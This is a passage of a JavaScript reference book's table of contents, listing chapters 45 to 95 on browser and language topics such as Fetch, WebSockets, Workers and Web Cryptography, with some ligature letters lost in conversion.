[283](#chapter-45-execcommand-and-contenteditable)](#chapter-45-execcommand-and-contenteditable)

[Section 45.1: Listening to Changes of contenteditable
[284](#section-45.1-listening-to-changes-of-contenteditable)](#section-45.1-listening-to-changes-of-contenteditable)

[Section 45.2: Getting started
[284](#section-45.2-getting-started)](#section-45.2-getting-started)

[Section 45.3: Copy to clipboard from textarea using
execCommand(&quot;copy&quot;)
[285](#section-45.3-copy-to-clipboard-from-textarea-using-execcommandcopy)](#section-45.3-copy-to-clipboard-from-textarea-using-execcommandcopy)

[Section 45.4: Formatting
[285](#section-45.4-formatting)](#section-45.4-formatting)

[**Chapter 46: History**
[287](#chapter-46-history)](#chapter-46-history)

[Section 46.1: history.pushState()
[287](#section-46.1-history.pushstate)](#section-46.1-history.pushstate)

[Section 46.2: history.replaceState()
[287](#section-46.2-history.replacestate)](#section-46.2-history.replacestate)

[Section 46.3: Load a specific URL from the history list
[287](#section-46.3-load-a-specific-url-from-the-history-list)](#section-46.3-load-a-specific-url-from-the-history-list)

[**Chapter 47: Navigator Object**
[289](#chapter-47-navigator-object)](#chapter-47-navigator-object)

[Section 47.1: Get some basic browser data and return it as a JSON
object
[289](#section-47.1-get-some-basic-browser-data-and-return-it-as-a-json-object)](#section-47.1-get-some-basic-browser-data-and-return-it-as-a-json-object)

[**Chapter 48: BOM (Browser Object Model)**
[290](#chapter-48-bom-browser-object-model)](#chapter-48-bom-browser-object-model)

[Section 48.1: Introduction
[290](#section-48.1-introduction)](#section-48.1-introduction)

[Section 48.2: Window Object Properties
[290](#section-48.2-window-object-properties)](#section-48.2-window-object-properties)

[Section 48.3: Window Object Methods
[291](#section-48.3-window-object-methods)](#section-48.3-window-object-methods)

[**Chapter 49: The Event Loop**
[292](#chapter-49-the-event-loop)](#chapter-49-the-event-loop)

[Section 49.1: The event loop in a web browser
[292](#section-49.1-the-event-loop-in-a-web-browser)](#section-49.1-the-event-loop-in-a-web-browser)

[Section 49.2: Asynchronous operations and the event loop
[293](#section-49.2-asynchronous-operations-and-the-event-loop)](#section-49.2-asynchronous-operations-and-the-event-loop)

[**Chapter 50: Strict mode**
[294](#chapter-50-strict-mode)](#chapter-50-strict-mode)

[Section 50.1: For entire scripts
[294](#section-50.1-for-entire-scripts)](#section-50.1-for-entire-scripts)

[Section 50.2: For functions
[294](#section-50.2-for-functions)](#section-50.2-for-functions)

[Section 50.3: Changes to properties
[294](#section-50.3-changes-to-properties)](#section-50.3-changes-to-properties)

[Section 50.4: Changes to global properties
[295](#section-50.4-changes-to-global-properties)](#section-50.4-changes-to-global-properties)

[Section 50.5: Duplicate Parameters
[296](#section-50.5-duplicate-parameters)](#section-50.5-duplicate-parameters)

[Section 50.6: Function scoping in strict mode
[296](#section-50.6-function-scoping-in-strict-mode)](#section-50.6-function-scoping-in-strict-mode)

[Section 50.7: Behaviour of a function&apos;s arguments list
[296](#section-50.7-behaviour-of-a-functions-arguments-list)](#section-50.7-behaviour-of-a-functions-arguments-list)

[Section 50.8: Non-Simple parameter lists
[297](#section-50.8-non-simple-parameter-lists)](#section-50.8-non-simple-parameter-lists)

[**Chapter 51: Custom Elements**
[299](#chapter-51-custom-elements)](#chapter-51-custom-elements)

[Section 51.1: Extending Native Elements
[299](#section-51.1-extending-native-elements)](#section-51.1-extending-native-elements)

[Section 51.2: Registering New Elements
[299](#section-51.2-registering-new-elements)](#section-51.2-registering-new-elements)

[**Chapter 52: Data Manipulation**
[300](#chapter-52-data-manipulation)](#chapter-52-data-manipulation)

[Section 52.1: Format numbers as money
[300](#section-52.1-format-numbers-as-money)](#section-52.1-format-numbers-as-money)

[Section 52.2: Extract extension from file name
[300](#section-52.2-extract-extension-from-file-name)](#section-52.2-extract-extension-from-file-name)

[Section 52.3: Set object property given its string name
[301](#section-52.3-set-object-property-given-its-string-name)](#section-52.3-set-object-property-given-its-string-name)

[**Chapter 53: Binary Data**
[302](#chapter-53-binary-data)](#chapter-53-binary-data)

[Section 53.1: Getting binary representation of an image file
[302](#section-53.1-getting-binary-representation-of-an-image-file)](#section-53.1-getting-binary-representation-of-an-image-file)

[Section 53.2: Converting between Blobs and ArrayBuers
[302](#section-53.2-converting-between-blobs-and-arraybuers)](#section-53.2-converting-between-blobs-and-arraybuers)

[Section 53.3: Manipulating ArrayBuers with DataViews
[303](#section-53.3-manipulating-arraybuers-with-dataviews)](#section-53.3-manipulating-arraybuers-with-dataviews)

[Section 53.4: Creating a TypedArray from a Base64 string
[303](#section-53.4-creating-a-typedarray-from-a-base64-string)](#section-53.4-creating-a-typedarray-from-a-base64-string)

[Section 53.5: Using TypedArrays
[304](#section-53.5-using-typedarrays)](#section-53.5-using-typedarrays)

[Section 53.6: Iterating through an arrayBuer
[304](#section-53.6-iterating-through-an-arraybuer)](#section-53.6-iterating-through-an-arraybuer)

[**Chapter 54: Template Literals**
[306](#chapter-54-template-literals)](#chapter-54-template-literals)

[Section 54.1: Basic interpolation and multiline strings
[306](#section-54.1-basic-interpolation-and-multiline-strings)](#section-54.1-basic-interpolation-and-multiline-strings)

[Section 54.2: Tagged strings
[306](#section-54.2-tagged-strings)](#section-54.2-tagged-strings)

[Section 54.3: Raw strings
[307](#section-54.3-raw-strings)](#section-54.3-raw-strings)

[Section 54.4: Templating HTML With Template Strings
[307](#section-54.4-templating-html-with-template-strings)](#section-54.4-templating-html-with-template-strings)

[Section 54.5: Introduction
[308](#section-54.5-introduction)](#section-54.5-introduction)

[**Chapter 55: Fetch** [309](#chapter-55-fetch)](#chapter-55-fetch)

[Section 55.1: Getting JSON data
[309](#section-55.1-getting-json-data)](#section-55.1-getting-json-data)

[Section 55.2: Set Request Headers
[309](#section-55.2-set-request-headers)](#section-55.2-set-request-headers)

[Section 55.3: POST Data
[309](#section-55.3-post-data)](#section-55.3-post-data)

[Section 55.4: Send cookies
[310](#section-55.4-send-cookies)](#section-55.4-send-cookies)

[Section 55.5: GlobalFetch
[310](#section-55.5-globalfetch)](#section-55.5-globalfetch)

[Section 55.6: Using Fetch to Display Questions from the Stack Overflow
API
[310](#section-55.6-using-fetch-to-display-questions-from-the-stack-overflow-api)](#section-55.6-using-fetch-to-display-questions-from-the-stack-overflow-api)

[**Chapter 56: Scope** [311](#chapter-56-scope)](#chapter-56-scope)

[Section 56.1: Closures
[311](#section-56.1-closures)](#section-56.1-closures)

[Section 56.2: Hoisting
[312](#section-56.2-hoisting)](#section-56.2-hoisting)

[Section 56.3: Dierence between var and let
[315](#section-56.3-dierence-between-var-and-let)](#section-56.3-dierence-between-var-and-let)

[Section 56.4: Apply and Call syntax and invocation
[317](#section-56.4-apply-and-call-syntax-and-invocation)](#section-56.4-apply-and-call-syntax-and-invocation)

[Section 56.5: Arrow function invocation
[318](#section-56.5-arrow-function-invocation)](#section-56.5-arrow-function-invocation)

[Section 56.6: Bound invocation
[319](#section-56.6-bound-invocation)](#section-56.6-bound-invocation)

[Section 56.7: Method invocation
[319](#section-56.7-method-invocation)](#section-56.7-method-invocation)

[Section 56.8: Anonymous invocation
[320](#section-56.8-anonymous-invocation)](#section-56.8-anonymous-invocation)

[Section 56.9: Constructor invocation
[320](#section-56.9-constructor-invocation)](#section-56.9-constructor-invocation)

[Section 56.10: Using let in loops instead of var (click handlers
example)
[320](#section-56.10-using-let-in-loops-instead-of-var-click-handlers-example)](#section-56.10-using-let-in-loops-instead-of-var-click-handlers-example)

[**Chapter 57: Modules**
[322](#chapter-57-modules)](#chapter-57-modules)

[Section 57.1: Defining a module
[322](#section-57.1-defining-a-module)](#section-57.1-defining-a-module)

[Section 57.2: Default exports
[322](#section-57.2-default-exports)](#section-57.2-default-exports)

[Section 57.3: Importing named members from another module
[323](#section-57.3-importing-named-members-from-another-module)](#section-57.3-importing-named-members-from-another-module)

[Section 57.4: Importing an entire module
[323](#section-57.4-importing-an-entire-module)](#section-57.4-importing-an-entire-module)

[Section 57.5: Importing named members with aliases
[324](#section-57.5-importing-named-members-with-aliases)](#section-57.5-importing-named-members-with-aliases)

[Section 57.6: Importing with side eects
[324](#section-57.6-importing-with-side-eects)](#section-57.6-importing-with-side-eects)

[Section 57.7: Exporting multiple named members
[324](#section-57.7-exporting-multiple-named-members)](#section-57.7-exporting-multiple-named-members)

[**Chapter 58: Screen** [325](#chapter-58-screen)](#chapter-58-screen)

[Section 58.1: Getting the screen resolution
[325](#section-58.1-getting-the-screen-resolution)](#section-58.1-getting-the-screen-resolution)

[Section 58.2: Getting the "available" area of the screen
[325](#section-58.2-getting-the-available-area-of-the-screen)](#section-58.2-getting-the-available-area-of-the-screen)

[Section 58.3: Page width and height
[325](#section-58.3-page-width-and-height)](#section-58.3-page-width-and-height)

[Section 58.4: Window innerWidth and innerHeight Properties
[325](#section-58.4-window-innerwidth-and-innerheight-properties)](#section-58.4-window-innerwidth-and-innerheight-properties)

[Section 58.5: Getting color information about the screen
[325](#section-58.5-getting-color-information-about-the-screen)](#section-58.5-getting-color-information-about-the-screen)

[**Chapter 59: Variable coercion/conversion**
[326](#chapter-59-variable-coercionconversion)](#chapter-59-variable-coercionconversion)

[Section 59.1: Double Negation (!!x)
[326](#section-59.1-double-negation-x)](#section-59.1-double-negation-x)

[Section 59.2: Implicit conversion
[326](#section-59.2-implicit-conversion)](#section-59.2-implicit-conversion)

[Section 59.3: Converting to boolean
[326](#section-59.3-converting-to-boolean)](#section-59.3-converting-to-boolean)

[Section 59.4: Converting a string to a number
[327](#section-59.4-converting-a-string-to-a-number)](#section-59.4-converting-a-string-to-a-number)

[Section 59.5: Converting a number to a string
[328](#section-59.5-converting-a-number-to-a-string)](#section-59.5-converting-a-number-to-a-string)

[Section 59.6: Primitive to Primitive conversion table
[328](#section-59.6-primitive-to-primitive-conversion-table)](#section-59.6-primitive-to-primitive-conversion-table)

[Section 59.7: Convert an array to a string
[328](#section-59.7-convert-an-array-to-a-string)](#section-59.7-convert-an-array-to-a-string)

[Section 59.8: Array to String using array methods
[329](#section-59.8-array-to-string-using-array-methods)](#section-59.8-array-to-string-using-array-methods)

[Section 59.9: Converting a number to a boolean
[329](#section-59.9-converting-a-number-to-a-boolean)](#section-59.9-converting-a-number-to-a-boolean)

[Section 59.10: Converting a string to a boolean
[329](#section-59.10-converting-a-string-to-a-boolean)](#section-59.10-converting-a-string-to-a-boolean)

[Section 59.11: Integer to Float
[329](#section-59.11-integer-to-float)](#section-59.11-integer-to-float)

[Section 59.12: Float to Integer
[330](#section-59.12-float-to-integer)](#section-59.12-float-to-integer)

[Section 59.13: Convert string to float
[330](#section-59.13-convert-string-to-float)](#section-59.13-convert-string-to-float)

[**Chapter 60: Destructuring assignment**
[331](#chapter-60-destructuring-assignment)](#chapter-60-destructuring-assignment)

[Section 60.1: Destructuring Objects
[331](#section-60.1-destructuring-objects)](#section-60.1-destructuring-objects)

[Section 60.2: Destructuring function arguments
[332](#section-60.2-destructuring-function-arguments)](#section-60.2-destructuring-function-arguments)

[Section 60.3: Nested Destructuring
[332](#section-60.3-nested-destructuring)](#section-60.3-nested-destructuring)

[Section 60.4: Destructuring Arrays
[333](#section-60.4-destructuring-arrays)](#section-60.4-destructuring-arrays)

[Section 60.5: Destructuring inside variables
[333](#section-60.5-destructuring-inside-variables)](#section-60.5-destructuring-inside-variables)

[Section 60.6: Default Value While Destructuring
[334](#section-60.6-default-value-while-destructuring)](#section-60.6-default-value-while-destructuring)

[Section 60.7: Renaming Variables While Destructuring
[334](#section-60.7-renaming-variables-while-destructuring)](#section-60.7-renaming-variables-while-destructuring)

[**Chapter 61: WebSockets**
[335](#chapter-61-websockets)](#chapter-61-websockets)

[Section 61.1: Working with string messages
[335](#section-61.1-working-with-string-messages)](#section-61.1-working-with-string-messages)

[Section 61.2: Establish a web socket connection
[335](#section-61.2-establish-a-web-socket-connection)](#section-61.2-establish-a-web-socket-connection)

[Section 61.3: Working with binary messages
[335](#section-61.3-working-with-binary-messages)](#section-61.3-working-with-binary-messages)

[Section 61.4: Making a secure web socket connection
[336](#section-61.4-making-a-secure-web-socket-connection)](#section-61.4-making-a-secure-web-socket-connection)

[**Chapter 62: Arrow Functions**
[337](#chapter-62-arrow-functions)](#chapter-62-arrow-functions)

[Section 62.1: Introduction
[337](#section-62.1-introduction)](#section-62.1-introduction)

[Section 62.2: Lexical Scoping & Binding (Value of &quot;this&quot;)
[337](#section-62.2-lexical-scoping-binding-value-of-this)](#section-62.2-lexical-scoping-binding-value-of-this)

[Section 62.3: Arguments Object
[338](#section-62.3-arguments-object)](#section-62.3-arguments-object)

[Section 62.4: Implicit Return
[338](#section-62.4-implicit-return)](#section-62.4-implicit-return)

[Section 62.5: Arrow functions as a constructor
[339](#section-62.5-arrow-functions-as-a-constructor)](#section-62.5-arrow-functions-as-a-constructor)

[Section 62.6: Explicit Return
[339](#section-62.6-explicit-return)](#section-62.6-explicit-return)

[**Chapter 63: Workers**
[340](#chapter-63-workers)](#chapter-63-workers)

[Section 63.1: Web Worker
[340](#section-63.1-web-worker)](#section-63.1-web-worker)

[Section 63.2: A simple service worker
[340](#section-63.2-a-simple-service-worker)](#section-63.2-a-simple-service-worker)

[Section 63.3: Register a service worker
[341](#section-63.3-register-a-service-worker)](#section-63.3-register-a-service-worker)

[Section 63.4: Communicating with a Web Worker
[341](#section-63.4-communicating-with-a-web-worker)](#section-63.4-communicating-with-a-web-worker)

[Section 63.5: Terminate a worker
[342](#section-63.5-terminate-a-worker)](#section-63.5-terminate-a-worker)

[Section 63.6: Populating your cache
[343](#section-63.6-populating-your-cache)](#section-63.6-populating-your-cache)

[Section 63.7: Dedicated Workers and Shared Workers
[343](#section-63.7-dedicated-workers-and-shared-workers)](#section-63.7-dedicated-workers-and-shared-workers)

[**Chapter 64: requestAnimationFrame**
[345](#chapter-64-requestanimationframe)](#chapter-64-requestanimationframe)

[Section 64.1: Use requestAnimationFrame to fade in element
[345](#section-64.1-use-requestanimationframe-to-fade-in-element)](#section-64.1-use-requestanimationframe-to-fade-in-element)

[Section 64.2: Keeping Compatibility
[346](#section-64.2-keeping-compatibility)](#section-64.2-keeping-compatibility)

[Section 64.3: Cancelling an Animation
[346](#section-64.3-cancelling-an-animation)](#section-64.3-cancelling-an-animation)

[**Chapter 65: Creational Design Patterns**
[348](#chapter-65-creational-design-patterns)](#chapter-65-creational-design-patterns)

[Section 65.1: Factory Functions
[348](#section-65.1-factory-functions)](#section-65.1-factory-functions)

[Section 65.2: Factory with Composition
[349](#section-65.2-factory-with-composition)](#section-65.2-factory-with-composition)

[Section 65.3: Module and Revealing Module Patterns
[350](#section-65.3-module-and-revealing-module-patterns)](#section-65.3-module-and-revealing-module-patterns)

[Section 65.4: Prototype Pattern
[352](#section-65.4-prototype-pattern)](#section-65.4-prototype-pattern)

[Section 65.5: Singleton Pattern
[353](#section-65.5-singleton-pattern)](#section-65.5-singleton-pattern)

[Section 65.6: Abstract Factory Pattern
[354](#section-65.6-abstract-factory-pattern)](#section-65.6-abstract-factory-pattern)

[**Chapter 66: Detecting browser**
[355](#chapter-66-detecting-browser)](#chapter-66-detecting-browser)

[Section 66.1: Feature Detection Method
[355](#section-66.1-feature-detection-method)](#section-66.1-feature-detection-method)

[Section 66.2: User Agent Detection
[355](#section-66.2-user-agent-detection)](#section-66.2-user-agent-detection)

[Section 66.3: Library Method
[356](#section-66.3-library-method)](#section-66.3-library-method)

[**Chapter 67: Symbols**
[357](#chapter-67-symbols)](#chapter-67-symbols)

[Section 67.1: Basics of symbol primitive type
[357](#section-67.1-basics-of-symbol-primitive-type)](#section-67.1-basics-of-symbol-primitive-type)

[Section 67.2: Using Symbol.for() to create global, shared symbols
[357](#section-67.2-using-symbol.for-to-create-global-shared-symbols)](#section-67.2-using-symbol.for-to-create-global-shared-symbols)

[Section 67.3: Converting a symbol into a string
[357](#section-67.3-converting-a-symbol-into-a-string)](#section-67.3-converting-a-symbol-into-a-string)

[**Chapter 68: Transpiling**
[359](#chapter-68-transpiling)](#chapter-68-transpiling)

[Section 68.1: Introduction to Transpiling
[359](#section-68.1-introduction-to-transpiling)](#section-68.1-introduction-to-transpiling)

[Section 68.2: Start using ES6/7 with Babel
[360](#section-68.2-start-using-es67-with-babel)](#section-68.2-start-using-es67-with-babel)

[**Chapter 69: Automatic Semicolon Insertion - ASI**
[361](#chapter-69-automatic-semicolon-insertionasi)](#chapter-69-automatic-semicolon-insertionasi)

[Section 69.1: Avoid semicolon insertion on return statements
[361](#section-69.1-avoid-semicolon-insertion-on-return-statements)](#section-69.1-avoid-semicolon-insertion-on-return-statements)

[Section 69.2: Rules of Automatic Semicolon Insertion
[361](#section-69.2-rules-of-automatic-semicolon-insertion)](#section-69.2-rules-of-automatic-semicolon-insertion)

[Section 69.3: Statements aected by automatic semicolon insertion
[362](#section-69.3-statements-aected-by-automatic-semicolon-insertion)](#section-69.3-statements-aected-by-automatic-semicolon-insertion)

[**Chapter 70: Localization**
[364](#chapter-70-localization)](#chapter-70-localization)

[Section 70.1: Number formatting
[364](#section-70.1-number-formatting)](#section-70.1-number-formatting)

[Section 70.2: Currency formatting
[364](#section-70.2-currency-formatting)](#section-70.2-currency-formatting)

[Section 70.3: Date and time formatting
[364](#section-70.3-date-and-time-formatting)](#section-70.3-date-and-time-formatting)

[**Chapter 71: Geolocation**
[365](#chapter-71-geolocation)](#chapter-71-geolocation)

[Section 71.1: Get updates when a user&apos;s location changes
[365](#section-71.1-get-updates-when-a-users-location-changes)](#section-71.1-get-updates-when-a-users-location-changes)

[Section 71.2: Get a user&apos;s latitude and longitude
[365](#section-71.2-get-a-users-latitude-and-longitude)](#section-71.2-get-a-users-latitude-and-longitude)

[Section 71.3: More descriptive error codes
[365](#section-71.3-more-descriptive-error-codes)](#section-71.3-more-descriptive-error-codes)

[**Chapter 72: IndexedDB**
[367](#chapter-72-indexeddb)](#chapter-72-indexeddb)

[Section 72.1: Opening a database
[367](#section-72.1-opening-a-database)](#section-72.1-opening-a-database)

[Section 72.2: Adding objects
[367](#section-72.2-adding-objects)](#section-72.2-adding-objects)

[Section 72.3: Retrieving data
[368](#section-72.3-retrieving-data)](#section-72.3-retrieving-data)

[Section 72.4: Testing for IndexedDB availability
[369](#section-72.4-testing-for-indexeddb-availability)](#section-72.4-testing-for-indexeddb-availability)

[**Chapter 73: Modularization Techniques**
[370](#chapter-73-modularization-techniques)](#chapter-73-modularization-techniques)

[Section 73.1: ES6 Modules
[370](#section-73.1-es6-modules)](#section-73.1-es6-modules)

[Section 73.2: Universal Module Definition (UMD)
[370](#section-73.2-universal-module-definition-umd)](#section-73.2-universal-module-definition-umd)

[Section 73.3: Immediately invoked function expressions (IIFE)
[371](#section-73.3-immediately-invoked-function-expressions-iife)](#section-73.3-immediately-invoked-function-expressions-iife)

[Section 73.4: Asynchronous Module Definition (AMD)
[371](#section-73.4-asynchronous-module-definition-amd)](#section-73.4-asynchronous-module-definition-amd)

[Section 73.5: CommonJS - Node.js
[372](#section-73.5-commonjsnode.js)](#section-73.5-commonjsnode.js)

[**Chapter 74: Proxy** [374](#chapter-74-proxy)](#chapter-74-proxy)

[Section 74.1: Proxying property lookup
[374](#section-74.1-proxying-property-lookup)](#section-74.1-proxying-property-lookup)

[Section 74.2: Very simple proxy (using the set trap)
[374](#section-74.2-very-simple-proxy-using-the-set-trap)](#section-74.2-very-simple-proxy-using-the-set-trap)

[**Chapter 75: .postMessage() and MessageEvent**
[376](#chapter-75-.postmessage-and-messageevent)](#chapter-75-.postmessage-and-messageevent)

[Section 75.1: Getting Started
[376](#section-75.1-getting-started)](#section-75.1-getting-started)

[**Chapter 76: WeakMap**
[379](#chapter-76-weakmap)](#chapter-76-weakmap)

[Section 76.1: Creating a WeakMap object
[379](#section-76.1-creating-a-weakmap-object)](#section-76.1-creating-a-weakmap-object)

[Section 76.2: Getting a value associated to the key
[379](#section-76.2-getting-a-value-associated-to-the-key)](#section-76.2-getting-a-value-associated-to-the-key)

[Section 76.3: Assigning a value to the key
[379](#section-76.3-assigning-a-value-to-the-key)](#section-76.3-assigning-a-value-to-the-key)

[Section 76.4: Checking if an element with the key exists
[379](#section-76.4-checking-if-an-element-with-the-key-exists)](#section-76.4-checking-if-an-element-with-the-key-exists)

[Section 76.5: Removing an element with the key
[380](#section-76.5-removing-an-element-with-the-key)](#section-76.5-removing-an-element-with-the-key)

[Section 76.6: Weak reference demo
[380](#section-76.6-weak-reference-demo)](#section-76.6-weak-reference-demo)

[**Chapter 77: WeakSet**
[382](#chapter-77-weakset)](#chapter-77-weakset)

[Section 77.1: Creating a WeakSet object
[382](#section-77.1-creating-a-weakset-object)](#section-77.1-creating-a-weakset-object)

[Section 77.2: Adding a value
[382](#section-77.2-adding-a-value)](#section-77.2-adding-a-value)

[Section 77.3: Checking if a value exists
[382](#section-77.3-checking-if-a-value-exists)](#section-77.3-checking-if-a-value-exists)

[Section 77.4: Removing a value
[382](#section-77.4-removing-a-value)](#section-77.4-removing-a-value)

[**Chapter 78: Escape Sequences**
[383](#chapter-78-escape-sequences)](#chapter-78-escape-sequences)

[Section 78.1: Entering special characters in strings and regular
expressions
[383](#section-78.1-entering-special-characters-in-strings-and-regular-expressions)](#section-78.1-entering-special-characters-in-strings-and-regular-expressions)

[Section 78.2: Escape sequence types
[383](#section-78.2-escape-sequence-types)](#section-78.2-escape-sequence-types)

[**Chapter 79: Behavioral Design Patterns**
[386](#chapter-79-behavioral-design-patterns)](#chapter-79-behavioral-design-patterns)

[Section 79.1: Observer pattern
[386](#section-79.1-observer-pattern)](#section-79.1-observer-pattern)

[Section 79.2: Mediator Pattern
[387](#section-79.2-mediator-pattern)](#section-79.2-mediator-pattern)

[Section 79.3: Command
[388](#section-79.3-command)](#section-79.3-command)

[Section 79.4: Iterator
[389](#section-79.4-iterator)](#section-79.4-iterator)

[**Chapter 80: Server-sent events**
[391](#chapter-80-server-sent-events)](#chapter-80-server-sent-events)

[Section 80.1: Setting up a basic event stream to the server
[391](#section-80.1-setting-up-a-basic-event-stream-to-the-server)](#section-80.1-setting-up-a-basic-event-stream-to-the-server)

[Section 80.2: Closing an event stream
[391](#section-80.2-closing-an-event-stream)](#section-80.2-closing-an-event-stream)

[Section 80.3: Binding event listeners to EventSource
[391](#section-80.3-binding-event-listeners-to-eventsource)](#section-80.3-binding-event-listeners-to-eventsource)

[**Chapter 81: Async functions (async/await)**
[393](#chapter-81-async-functions-asyncawait)](#chapter-81-async-functions-asyncawait)

[Section 81.1: Introduction
[393](#section-81.1-introduction)](#section-81.1-introduction)

[Section 81.2: Await and operator precedence
[393](#section-81.2-await-and-operator-precedence)](#section-81.2-await-and-operator-precedence)

[Section 81.3: Async functions compared to Promises
[394](#section-81.3-async-functions-compared-to-promises)](#section-81.3-async-functions-compared-to-promises)

[Section 81.4: Looping with async await
[395](#section-81.4-looping-with-async-await)](#section-81.4-looping-with-async-await)

[Section 81.5: Less indentation
[396](#section-81.5-less-indentation)](#section-81.5-less-indentation)

[Section 81.6: Simultaneous async (parallel) operations
[397](#section-81.6-simultaneous-async-parallel-operations)](#section-81.6-simultaneous-async-parallel-operations)

[**Chapter 82: Async Iterators**
[398](#chapter-82-async-iterators)](#chapter-82-async-iterators)

[Section 82.1: Basics [398](#section-82.1-basics)](#section-82.1-basics)

[**Chapter 83: How to make iterator usable inside async callback
function**
[399](#chapter-83-how-to-make-iterator-usable-inside-async-callback-function)](#chapter-83-how-to-make-iterator-usable-inside-async-callback-function)

[Section 83.1: Erroneous code, can you spot why this usage of key will
lead to bugs?
[399](#section-83.1-erroneous-code-can-you-spot-why-this-usage-of-key-will-lead-to-bugs)](#section-83.1-erroneous-code-can-you-spot-why-this-usage-of-key-will-lead-to-bugs)

[Section 83.2: Correct Writing
[399](#section-83.2-correct-writing)](#section-83.2-correct-writing)

[**Chapter 84: Tail Call Optimization**
[400](#chapter-84-tail-call-optimization)](#chapter-84-tail-call-optimization)

[Section 84.1: What is Tail Call Optimization (TCO)
[400](#section-84.1-what-is-tail-call-optimization-tco)](#section-84.1-what-is-tail-call-optimization-tco)

[Section 84.2: Recursive loops
[400](#section-84.2-recursive-loops)](#section-84.2-recursive-loops)

[**Chapter 85: Bitwise Operators - Real World Examples (snippets)**
[401](#chapter-85-bitwise-operatorsreal-world-examples-snippets)](#chapter-85-bitwise-operatorsreal-world-examples-snippets)

[Section 85.1: Swapping Two Integers with Bitwise XOR (without
additional memory allocation)
[401](#section-85.1-swapping-two-integers-with-bitwise-xor-without-additional-memory-allocation)](#section-85.1-swapping-two-integers-with-bitwise-xor-without-additional-memory-allocation)

[Section 85.2: Faster multiplication or division by powers of 2
[401](#section-85.2-faster-multiplication-or-division-by-powers-of-2)](#section-85.2-faster-multiplication-or-division-by-powers-of-2)

[Section 85.3: Number&apos;s Parity Detection with Bitwise AND
[401](#section-85.3-numbers-parity-detection-with-bitwise-and)](#section-85.3-numbers-parity-detection-with-bitwise-and)

[**Chapter 86: Tilde &bsol;~** [403](#chapter-86-tilde)](#chapter-86-tilde)

[Section 86.1: &bsol;~ Integer
[403](#section-86.1-integer)](#section-86.1-integer)

[Section 86.2: &bsol;~&bsol;~ Operator
[403](#section-86.2-operator)](#section-86.2-operator)

[Section 86.3: Converting Non-numeric values to Numbers
[404](#section-86.3-converting-non-numeric-values-to-numbers)](#section-86.3-converting-non-numeric-values-to-numbers)

[Section 86.4: Shorthands
[404](#section-86.4-shorthands)](#section-86.4-shorthands)

[Section 86.5: &bsol;~ Decimal
[404](#section-86.5-decimal)](#section-86.5-decimal)

[**Chapter 87: Using JavaScript to get/set CSS custom variables**
[406](#chapter-87-using-javascript-to-getset-css-custom-variables)](#chapter-87-using-javascript-to-getset-css-custom-variables)

[Section 87.1: How to get and set CSS variable property values
[406](#section-87.1-how-to-get-and-set-css-variable-property-values)](#section-87.1-how-to-get-and-set-css-variable-property-values)

[**Chapter 88: Selection API**
[407](#chapter-88-selection-api)](#chapter-88-selection-api)

[Section 88.1: Get the text of the selection
[407](#section-88.1-get-the-text-of-the-selection)](#section-88.1-get-the-text-of-the-selection)

[Section 88.2: Deselect everything that is selected
[407](#section-88.2-deselect-everything-that-is-selected)](#section-88.2-deselect-everything-that-is-selected)

[Section 88.3: Select the contents of an element
[407](#section-88.3-select-the-contents-of-an-element)](#section-88.3-select-the-contents-of-an-element)

[**Chapter 89: File API, Blobs and FileReaders**
[408](#chapter-89-file-api-blobs-and-filereaders)](#chapter-89-file-api-blobs-and-filereaders)

[Section 89.1: Read file as string
[408](#section-89.1-read-file-as-string)](#section-89.1-read-file-as-string)

[Section 89.2: Read file as dataURL
[408](#section-89.2-read-file-as-dataurl)](#section-89.2-read-file-as-dataurl)

[Section 89.3: Slice a file
[409](#section-89.3-slice-a-file)](#section-89.3-slice-a-file)

[Section 89.4: Get the properties of the file
[409](#section-89.4-get-the-properties-of-the-file)](#section-89.4-get-the-properties-of-the-file)

[Section 89.5: Selecting multiple files and restricting file types
[410](#section-89.5-selecting-multiple-files-and-restricting-file-types)](#section-89.5-selecting-multiple-files-and-restricting-file-types)

[Section 89.6: Client side csv download using Blob
[410](#section-89.6-client-side-csv-download-using-blob)](#section-89.6-client-side-csv-download-using-blob)

[**Chapter 90: Notifications API**
[411](#chapter-90-notifications-api)](#chapter-90-notifications-api)

[Section 90.1: Requesting Permission to send notifications
[411](#section-90.1-requesting-permission-to-send-notifications)](#section-90.1-requesting-permission-to-send-notifications)

[Section 90.2: Sending Notifications
[411](#section-90.2-sending-notifications)](#section-90.2-sending-notifications)

[Section 90.3: Closing a notification
[411](#section-90.3-closing-a-notification)](#section-90.3-closing-a-notification)

[Section 90.4: Notification events
[412](#section-90.4-notification-events)](#section-90.4-notification-events)

[**Chapter 91: Vibration API**
[413](#chapter-91-vibration-api)](#chapter-91-vibration-api)

[Section 91.1: Single vibration
[413](#section-91.1-single-vibration)](#section-91.1-single-vibration)

[Section 91.2: Check for support
[413](#section-91.2-check-for-support)](#section-91.2-check-for-support)

[Section 91.3: Vibration patterns
[413](#section-91.3-vibration-patterns)](#section-91.3-vibration-patterns)

[**Chapter 92: Battery Status API**
[414](#chapter-92-battery-status-api)](#chapter-92-battery-status-api)

[Section 92.1: Battery Events
[414](#section-92.1-battery-events)](#section-92.1-battery-events)

[Section 92.2: Getting current battery level
[414](#section-92.2-getting-current-battery-level)](#section-92.2-getting-current-battery-level)

[Section 92.3: Is battery charging?
[414](#section-92.3-is-battery-charging)](#section-92.3-is-battery-charging)

[Section 92.4: Get time left until battery is empty
[414](#section-92.4-get-time-left-until-battery-is-empty)](#section-92.4-get-time-left-until-battery-is-empty)

[Section 92.5: Get time left until battery is fully charged
[414](#section-92.5-get-time-left-until-battery-is-fully-charged)](#section-92.5-get-time-left-until-battery-is-fully-charged)

[**Chapter 93: Fluent API**
[415](#chapter-93-fluent-api)](#chapter-93-fluent-api)

[Section 93.1: Fluent API capturing construction of HTML articles with
JS
[415](#section-93.1-fluent-api-capturing-construction-of-html-articles-with-js)](#section-93.1-fluent-api-capturing-construction-of-html-articles-with-js)

[**Chapter 94: Web Cryptography API**
[417](#chapter-94-web-cryptography-api)](#chapter-94-web-cryptography-api)

[Section 94.1: Creating digests (e.g. SHA-256)
[417](#section-94.1-creating-digests-e.g.-sha-256)](#section-94.1-creating-digests-e.g.-sha-256)

[Section 94.2: Cryptographically random data
[417](#section-94.2-cryptographically-random-data)](#section-94.2-cryptographically-random-data)

[Section 94.3: Generating RSA key pair and converting to PEM format
[418](#section-94.3-generating-rsa-key-pair-and-converting-to-pem-format)](#section-94.3-generating-rsa-key-pair-and-converting-to-pem-format)

[Section 94.4: Converting PEM key pair to CryptoKey
[419](#section-94.4-converting-pem-key-pair-to-cryptokey)](#section-94.4-converting-pem-key-pair-to-cryptokey)

[**Chapter 95: Security issues**
